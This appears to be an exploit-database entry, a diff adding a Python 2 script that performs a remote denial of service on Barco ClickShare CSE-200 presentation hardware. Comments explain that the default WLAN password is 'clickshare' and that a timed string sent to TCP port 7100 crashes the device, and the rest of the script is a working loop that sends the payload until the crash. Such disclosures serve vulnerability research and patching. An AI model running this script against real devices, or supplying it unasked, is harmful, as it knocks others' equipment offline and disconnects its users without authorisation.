@@ -1,0 +1,62 @@
+#!/usr/bin/python
+
+# Exploit Title: Barco ClickShare CSE-200 - Remote Denial of Service
+# Date: 11-04-2018
+# Hardware Link: https://www.barco.com/de/product/clickshare-cse-200
+# Exploit Author: Florian Hauser
+# Contact: florian DOT g DOT hauser AT gmail DOT com
+# CVE: requested by Barco
+# Category: Hardware
+
+#  Disclaimer:
+#  This or previous programs is for Educational 
+#  purpose ONLY. Do not use it without permission. 
+#  The usual disclaimer applies, especially the 
+#  fact that Florian Hauser is not liable for any 
+#  damages caused by direct or indirect use of the 
+#  information or functionality provided by these 
+#  programs. The author or any Internet provider 
+#  bears NO responsibility for content or misuse 
+#  of these programs or any derivatives thereof.
+#  By using these programs you accept the fact 
+#  that any damage (dataloss, system crash, 
+#  system compromise, etc.) caused by the use 
+#  of these programs is not Florian Hauser's 
+#  responsibility.
+#   
+#  Use them at your own risk!
+################
+# Vulnerability description (you have to be connected to the ClickShare WLAN for that, standard password is 'clickshare'):
+# Sending arbitrary unexpected string to TCP port 7100 with respect to -> a certain time sequence <-
+# not only disconnects all clients but also results in a crash of this hardware device
+# Recover: Switch energy supply off for several minutes and reboot the system. Patches will be delivered in July 2018.
+# I got permission from Barco to disclose this vulnerability.
+# This affects potentially all other ClickShare products, Barco confirms
+
+import socket
+import sys
+from time import sleep
+
+if len(sys.argv) != 2:
+	print "Usage: exploit.py <ip>"
+	sys.exit(0)
+
+
+# Sending random string until crash occurs. Max. of 50 seems definitely sufficient for that.
+# 6-7 requests do the job usually
+for x in range(1,50):
+	#Create a new socket each time because otherwise the service drops the socket
+	#Same request cannot be sent several times in sequence
+	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	
+	#Connect to vulnerable TCP port 7100
+	connect=s.connect((str(sys.argv[1]), 7100))
+	s.send('some evil string \r\n\n')
+	print "Buffer " + str(x) + " sent...\n"
+	
+	result=s.recv(1024)
+	print result
+	s.close()
+	
+	#Sleep for a few seconds because otherwise the service denies a socket creation but does not crash
+	sleep(7)
